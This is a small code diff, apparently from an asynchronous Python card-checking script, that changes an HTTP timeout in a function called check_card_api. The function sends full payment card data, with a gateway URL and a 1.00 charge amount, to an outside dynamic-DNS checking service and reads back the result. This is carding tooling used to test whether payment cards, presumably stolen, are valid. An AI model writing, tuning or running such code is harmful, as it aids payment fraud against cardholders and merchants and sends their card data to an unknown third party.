@@ -77,7 +77,7 @@ async def check_card_api(card_full):
     params = {"url": gate, "card": card_full, "amount": 1.00}
     async with api_semaphore:
         try:
-            async with httpx.AsyncClient(timeout=15) as client:
+            async with httpx.AsyncClient(timeout=10) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
